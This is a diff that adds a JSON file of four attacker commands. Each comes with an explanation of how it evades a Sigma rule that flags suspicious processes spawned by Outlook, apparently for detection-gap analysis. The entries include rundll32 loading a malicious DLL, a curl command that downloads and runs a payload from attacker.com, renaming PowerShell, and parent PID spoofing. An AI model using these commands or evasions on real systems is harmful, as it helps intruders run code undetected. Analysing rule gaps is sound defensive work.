@@ -1,0 +1,18 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\rundll32.exe C:\\path\\to\\malicious.dll,EntryPoint",
+    "explanation": "The Sigma rule explicitly comments out 'rundll32.exe' from the detection list due to high false positive rates (e.g., PhotoViewer or Print Attachments). An attacker can use Outlook to spawn rundll32.exe to execute a malicious DLL, bypassing the current 'selection' logic."
+  },
+  {
+    "output": "C:\\Windows\\System32\\curl.exe -o C:\\Users\\Public\\payload.exe http://attacker.com/payload.exe && C:\\Users\\Public\\payload.exe",
+    "explanation": "The rule uses a strict 'allow-list' of suspicious binaries (cmd, powershell, etc.). It does not include 'curl.exe' or 'certutil.exe', which are commonly available on modern Windows systems. Spawning curl.exe directly from Outlook to download and execute a payload would not trigger this specific rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Start-Process notepad.exe\"",
+    "explanation": "While this specific command is listed as an example of what to detect, if an attacker renames 'powershell.exe' to 'not_suspicious.exe' and executes it from Outlook, the 'Image|endswith' filter will fail to match because it looks for the specific filename '\\powershell.exe'."
+  },
+  {
+    "output": "COM-based lateral movement or 'Parent PID Spoofing' technique.",
+    "explanation": "If the exploit code running within Outlook uses Parent PID Spoofing (via UpdateProcThreadAttribute) to set a different process (like explorer.exe) as the parent of the malicious process, the 'ParentImage' will not be '\\OUTLOOK.EXE', effectively bypassing the rule."
+  }
+]
